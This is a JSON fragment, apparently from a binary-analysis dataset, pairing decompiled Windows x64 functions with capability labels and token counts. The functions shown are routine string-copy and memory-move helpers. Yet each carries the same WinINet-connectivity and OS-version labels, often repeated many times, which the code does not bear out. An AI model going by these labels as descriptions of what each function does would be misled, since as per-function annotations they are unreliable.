            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400a0b80(int64_t **arg1, int64_t arg2, uint64_t arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    uchar *puVar2;\n    int64_t *piVar3;\n    uchar *puVar4;\n    int64_t **ppiVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    bool bVar9;\n    uint64_t in_stack_00000028;\n    \n    piVar3 = arg1[1];\n    if ((arg3 + 0x3fffffffffffffff) - piVar3 < in_stack_00000028) {\n        iVar8 = 0x1400fe9c5;\n        fcn.1400b7170(0x1400fe9c5);\n        ppiVar5 = 0x7fffffff;\n        uVar6 = iVar8 - arg2;\n        if ((uVar6 < 0x80000000) && (ppiVar5 = 0x80000000,  -0x80000001 < uVar6)) {\n            ppiVar5 = uVar6 & 0xffffffff;\n        }\n        return ppiVar5;\n    }\n    ppiVar5 = *arg1;\n    piVar1 = piVar3 + (in_stack_00000028 - arg3);\n    if (ppiVar5 == arg1 + 2) {\n        piVar7 = 0xf;\n    }\n    else {\n        piVar7 = arg1[2];\n    }\n    if (piVar7 < piVar1) {\n        fcn.1400a3380(arg1, arg2, arg3, arg4);\n        goto code_r0x0001400a0c4d;\n    }\n    puVar2 = ppiVar5 + arg2;\n    iVar8 = piVar3 - (arg2 + arg3);\n    bVar9 = iVar8 == 0;\n    if ((arg4 < ppiVar5) || (ppiVar5 + piVar3 < arg4)) {\n        if ((arg3 != in_stack_00000028) && (!bVar9)) {\n            if (iVar8 == 1) {\n                puVar2[in_stack_00000028] = puVar2[arg3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar2 + in_stack_00000028, puVar2 + arg3, iVar8);\n            }\n        }\n        if (in_stack_00000028 == 0) goto code_r0x0001400a0c4d;\n        if (in_stack_00000028 != 1) {\n            sub.msvcrt.dll_memcpy(puVar2, arg4, in_stack_00000028);\n            goto code_r0x0001400a0c4d;\n        }\n    }\n    else {\n        if (in_stack_00000028 - 1 < arg3) {\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memmove(puVar2, arg4, in_stack_00000028);\n                goto code_r0x0001400a0ca9;\n            }\n            *puVar2 = *arg4;\n            if ((arg3 == 1) || (bVar9)) goto code_r0x0001400a0c4d;\n            puVar4 = puVar2 + 1;\n            if (iVar8 == 1) {\n                puVar2[1] = puVar2[arg3];\n                goto code_r0x0001400a0c4d;\n            }\ncode_r0x0001400a0cc7:\n            sub.msvcrt.dll_memmove(puVar4, puVar2 + arg3, iVar8);\n        }\n        else {\ncode_r0x0001400a0ca9:\n            if ((arg3 != in_stack_00000028) && (!bVar9)) {\n                puVar4 = puVar2 + in_stack_00000028;\n                if (iVar8 != 1) goto code_r0x0001400a0cc7;\n                *puVar4 = puVar2[arg3];\n            }\n        }\n        if (in_stack_00000028 <= arg3) goto code_r0x0001400a0c4d;\n        ppiVar5 = puVar2 + arg3;\n        if (ppiVar5 < arg4 + in_stack_00000028) {\n            if (arg4 < ppiVar5) {\n                uVar6 = ppiVar5 - arg4;\n                if (uVar6 == 1) {\n                    *puVar2 = *arg4;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar2, arg4, uVar6);\n                }\n                if (in_stack_00000028 - uVar6 == 1) {\n                    puVar2[uVar6] = puVar2[in_stack_00000028];\n                }\n                else if (in_stack_00000028 != uVar6) {\n                    sub.msvcrt.dll_memcpy();\n                }\n            }\n            else {\n                puVar4 = arg4 + (in_stack_00000028 - arg3);\n                if (in_stack_00000028 == 1) {\n                    *puVar2 = *puVar4;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar2, puVar4, in_stack_00000028);\n                }\n            }\n            goto code_r0x0001400a0c4d;\n        }\n        if (in_stack_00000028 != 1) {\n            sub.msvcrt.dll_memmove(puVar2, arg4, in_stack_00000028);\n            goto code_r0x0001400a0c4d;\n        }\n    }\n    *puVar2 = *arg4;\ncode_r0x0001400a0c4d:\n    arg1[1] = piVar1;\n    *(*arg1 + piVar1) = 0;\n    return arg1;\n}\n",
        "token_count": 1328
    },
    "1400a0ed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a0ed0(char **arg1, char *arg2, uint64_t arg3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char **noname_0;\n    char *pcVar3;\n    char cVar4;\n    uint64_t uVar5;\n    char *pcStack256;\n    char *pcStack248;\n    char **ppcStack240;\n    char *pcStack232;\n    char *pcStack192;\n    char **ppcStack184;\n    char *pcStack176;\n    char *pcStack136;\n    char **ppcStack128;\n    char *pcStack120;\n    char *pcStack80;\n    char **ppcStack72;\n    uint64_t uStack64;\n    \n    uVar5 = arg3 & 0xffffffff;\n    if (arg2 < 0x10) {\n        if (arg2 == NULL) goto code_r0x0001400a0ef7;\n        pcVar1 = *arg1;\n        cVar4 = arg3;\n        if (arg2 == 0x1) {\n            *pcVar1 = cVar4;\n            goto code_r0x0001400a0ef7;\n        }\n    }\n    else {\n        if (arg2 >> 0x3e != 0) {\n            ppcStack128 = 0x1400fe8c0;\n            uStack64 = 0x1400a0f52;\n            pcVar1 = arg2;\n            fcn.1400b7170(0x1400fe8c0);\n            pcStack136 = arg3 - pcVar1;\n            pcStack80 = arg2;\n            ppcStack72 = arg1;\n            uStack64 = uVar5;\n            if (pcStack136 < 0x10) {\n                pcVar2 = *ppcStack128;\n                if (pcStack136 == 0x1) {\n                    *pcVar2 = *pcVar1;\n                    ppcStack128[1] = 0x1;\n                    (*ppcStack128)[1] = '\\0';\n                    return;\n                }\n                if (pcStack136 == NULL) {\n                    ppcStack128[1] = NULL;\n                    *pcVar2 = '\\0';\n                    return;\n                }\n            }\n            else {\n                if (pcStack136 >> 0x3e != 0) {\n                    ppcStack184 = 0x1400fe8c0;\n                    pcStack120 = 0x1400a1006;\n                    pcVar2 = pcVar1;\n                    fcn.1400b7170(0x1400fe8c0);\n                    pcStack192 = arg3 - pcVar2;\n                    pcStack120 = pcVar1;\n                    if (pcStack192 < 0x10) {\n                        pcVar1 = *ppcStack184;\n                        if (pcStack192 == 0x1) {\n                            *pcVar1 = *pcVar2;\n                            ppcStack184[1] = 0x1;\n                            (*ppcStack184)[1] = '\\0';\n                            return;\n                        }\n                        if (pcStack192 == NULL) {\n                            ppcStack184[1] = NULL;\n                            *pcVar1 = '\\0';\n                            return;\n                        }\n                    }\n                    else {\n                        if (pcStack192 >> 0x3e != 0) {\n                            ppcStack240 = 0x1400fe8c0;\n                            pcStack176 = 0x1400a10b6;\n                            pcVar1 = pcVar2;\n                            fcn.1400b7170(0x1400fe8c0);\n                            pcStack248 = arg3 - pcVar1;\n                            pcStack176 = pcVar2;\n                            if (pcStack248 < 0x10) {\n                                pcVar2 = *ppcStack240;\n                                if (pcStack248 == 0x1) {\n                                    *pcVar2 = *pcVar1;\n                                    ppcStack240[1] = 0x1;\n                                    (*ppcStack240)[1] = '\\0';\n                                    return;\n                                }\n                                if (pcStack248 == NULL) {\n                                    ppcStack240[1] = NULL;\n                                    *pcVar2 = '\\0';\n                                    return;\n                                }\n                            }\n                            else {\n                                if (pcStack248 >> 0x3e != 0) {\n                                    noname_0 = 0x1400fe8c0;\n                                    pcStack232 = 0x1400a1166;\n                                    pcVar2 = pcVar1;\n                                    fcn.1400b7170(0x1400fe8c0);\n                                    pcVar3 = arg3 - pcVar2;\n                                    pcStack256 = pcVar3;\n                                    pcStack232 = pcVar1;\n                                    if (pcVar3 < 0x10) {\n                                        pcVar1 = *noname_0;\n                                        if (pcVar3 == 0x1) {\n                                            *pcVar1 = *pcVar2;\n                                            noname_0[1] = 0x1;\n                                            (*noname_0)[1] = '\\0';\n                                            return;\n                                        }\n                                        if (pcVar3 == NULL) {\n                                            noname_0[1] = NULL;\n                                            *pcVar1 = '\\0';\n                                            return;\n                                        }\n                                    }\n                                    else {\n                                        pcVar1 = fcn.1400a3300(noname_0, &stack0xffffffffffffff00, 0);\n                                        *noname_0 = pcVar1;\n                                        noname_0[2] = pcStack256;\n                                    }\n                                    sub.msvcrt.dll_memcpy(pcVar1, pcVar2, pcVar3);\n                                    noname_0[1] = pcStack256;\n                                    (*noname_0)[pcStack256] = '\\0';\n                                    return;\n                                }\n                                pcStack232 = 0x1400a1132;\n                                pcVar2 = fcn.1400b6520(pcStack248 + 1);\n                                ppcStack240[2] = pcStack248;\n                                *ppcStack240 = pcVar2;\n                            }\n                            pcStack232 = 0x1400a1147;\n                            sub.msvcrt.dll_memcpy(pcVar2, pcVar1, pcStack248);\n                            ppcStack240[1] = pcStack248;\n                            (*ppcStack240)[pcStack248] = '\\0';\n                            return;\n                        }\n                        pcStack176 = 0x1400a1082;\n                        pcVar1 = fcn.1400b6520(pcStack192 + 1);\n                        ppcStack184[2] = pcStack192;\n                        *ppcStack184 = pcVar1;\n                    }\n                    pcStack176 = 0x1400a1097;\n                    sub.msvcrt.dll_memcpy(pcVar1, pcVar2, pcStack192);\n                    ppcStack184[1] = pcStack192;\n                    (*ppcStack184)[pcStack192] = '\\0';\n                    return;\n                }\n                pcStack120 = 0x1400a0fd2;\n                pcVar2 = fcn.1400b6520(pcStack136 + 1);\n                ppcStack128[2] = pcStack136;\n                *ppcStack128 = pcVar2;\n            }\n            pcStack120 = 0x1400a0fe7;\n            sub.msvcrt.dll_memcpy(pcVar2, pcVar1, pcStack136);\n            ppcStack128[1] = pcStack136;\n            (*ppcStack128)[pcStack136] = '\\0';\n            return;\n        }\n        uStack64 = 0x1400a0f22;\n        pcVar1 = fcn.1400b6520(arg2 + 1);\n        arg1[2] = arg2;\n        cVar4 = uVar5;\n        *arg1 = pcVar1;\n    }\n    uStack64 = 0x1400a0f38;\n    sub.msvcrt.dll_memset(pcVar1, cVar4, arg2);\ncode_r0x0001400a0ef7:\n    arg1[1] = arg2;\n    (*arg1)[arg2] = '\\0';\n    return;\n}\n",
        "token_count": 1785
    },
    "1400a10c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a10c0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int64_t *noname_0;\n    uint64_t uVar3;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    int64_t *piStack72;\n    uchar *puStack64;\n    \n    uStack80 = arg3 - arg2;\n    if (uStack80 < 0x10) {\n        puVar1 = *arg1;\n        if (uStack80 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uStack80 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        if (uStack80 >> 0x3e != 0) {\n            noname_0 = 0x1400fe8c0;\n            puStack64 = 0x1400a1166;\n            puVar1 = arg2;\n            fcn.1400b7170(0x1400fe8c0);\n            uVar3 = arg3 - puVar1;\n            uStack88 = uVar3;\n            piStack72 = arg1;\n            puStack64 = arg2;\n            if (uVar3 < 0x10) {\n                puVar2 = *noname_0;\n                if (uVar3 == 1) {\n                    *puVar2 = *puVar1;\n                    noname_0[1] = 1;\n                    *(*noname_0 + 1) = 0;\n                    return;\n                }\n                if (uVar3 == 0) {\n                    noname_0[1] = 0;\n                    *puVar2 = 0;\n                    return;\n                }\n            }\n            else {\n                puVar2 = fcn.1400a3300(noname_0, &stack0xffffffffffffffa8, 0);\n                *noname_0 = puVar2;\n                noname_0[2] = uStack88;\n            }\n            sub.msvcrt.dll_memcpy(puVar2, puVar1, uVar3);\n            noname_0[1] = uStack88;\n            *(*noname_0 + uStack88) = 0;\n            return;\n        }\n        puStack64 = 0x1400a1132;\n        puVar1 = fcn.1400b6520(uStack80 + 1);\n        arg1[2] = uStack80;\n        *arg1 = puVar1;\n    }\n    puStack64 = 0x1400a1147;\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uStack80);\n    arg1[1] = uStack80;\n    *(*arg1 + uStack80) = 0;\n    return;\n}\n",
        "token_count": 671
    },
    "1400a117": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a1170(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a121": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a1210(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a12b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a12b0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 277
    },
    "1400a135": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a1350(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a13f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a13f0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 277
    },
    "1400a149": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a1490(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int64_t *noname_0;\n    uint64_t uVar3;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    int64_t *piStack72;\n    uchar *puStack64;\n    \n    uStack80 = arg3 - arg2;\n    if (uStack80 < 0x10) {\n        puVar1 = *arg1;\n        if (uStack80 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uStack80 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        if (uStack80 >> 0x3e != 0) {\n            noname_0 = 0x1400fe8c0;\n            puStack64 = 0x1400a1536;\n            puVar1 = arg2;\n            fcn.1400b7170(0x1400fe8c0);\n            uVar3 = arg3 - puVar1;\n            uStack88 = uVar3;\n            piStack72 = arg1;\n            puStack64 = arg2;\n            if (uVar3 < 0x10) {\n                puVar2 = *noname_0;\n                if (uVar3 == 1) {\n                    *puVar2 = *puVar1;\n                    noname_0[1] = 1;\n                    *(*noname_0 + 1) = 0;\n                    return;\n                }\n                if (uVar3 == 0) {\n                    noname_0[1] = 0;\n                    *puVar2 = 0;\n                    return;\n                }\n            }\n            else {\n                puVar2 = fcn.1400a3300(noname_0, &stack0xffffffffffffffa8, 0);\n                *noname_0 = puVar2;\n                noname_0[2] = uStack88;\n            }\n            sub.msvcrt.dll_memcpy(puVar2, puVar1, uVar3);\n            noname_0[1] = uStack88;\n            *(*noname_0 + uStack88) = 0;\n            return;\n        }\n        puStack64 = 0x1400a1502;\n        puVar1 = fcn.1400b6520(uStack80 + 1);\n        arg1[2] = uStack80;\n        *arg1 = puVar1;\n    }\n    puStack64 = 0x1400a1517;\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uStack80);\n    arg1[1] = uStack80;\n    *(*arg1 + uStack80) = 0;\n    return;\n}\n",
        "token_count": 670
    },
    "1400a154": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a1540(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a3300(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a169": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a1690(int64_t *arg1, int64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char in_stack_00000028;\n    \n    iVar5 = arg1[1];\n    if (arg4 <= (arg3 + 0x3fffffffffffffff) - iVar5) {\n        piVar4 = *arg1;\n        uVar6 = (arg4 - arg3) + iVar5;\n        if (piVar4 == arg1 + 2) {\n            uVar2 = 0xf;\n        }\n        else {\n            uVar2 = arg1[2];\n        }\n        if (uVar2 < uVar6) {\n            fcn.1400a3380(arg1, arg2, arg3, 0);\n            piVar4 = *arg1;\n        }\n        else {\n            iVar5 = iVar5 - (arg3 + arg2);\n            if ((iVar5 != 0) && (arg3 != arg4)) {\n                puVar1 = piVar4 + arg3 + arg2;\n                puVar3 = piVar4 + arg4 + arg2;\n                if (iVar5 == 1) {\n                    *puVar3 = *puVar1;\n                    piVar4 = *arg1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar3, puVar1, iVar5);\n                    piVar4 = *arg1;\n                }\n            }\n        }\n        if (arg4 != 0) {\n            if (arg4 == 1) {\n                *(piVar4 + arg2) = in_stack_00000028;\n                piVar4 = *arg1;\n            }\n            else {\n                sub.msvcrt.dll_memset(piVar4 + arg2, in_stack_00000028, arg4);\n                piVar4 = *arg1;\n            }\n        }\n        arg1[1] = uVar6;\n        *(piVar4 + uVar6) = 0;\n        return arg1;\n    }\n    piVar4 = 0x1400fe97d;\n    fcn.1400b7170(0x1400fe97d);\n    return piVar4;\n}\n",
        "token_count": 530
    },
    "1400a312": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a3120(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    iVar2 = arg1[1];\n    iVar1 = arg2 + arg3;\n    if ((iVar2 != iVar1) && (arg3 != 0)) {\n        puVar4 = iVar1 + *arg1;\n        puVar3 = *arg1 + arg2;\n        if (iVar2 - iVar1 == 1) {\n            *puVar3 = *puVar4;\n            iVar2 = arg1[1];\n        }\n        else {\n            sub.msvcrt.dll_memmove(puVar3, puVar4);\n            iVar2 = arg1[1];\n        }\n    }\n    arg1[1] = iVar2 - arg3;\n    *(*arg1 + (iVar2 - arg3)) = 0;\n    return;\n}\n",
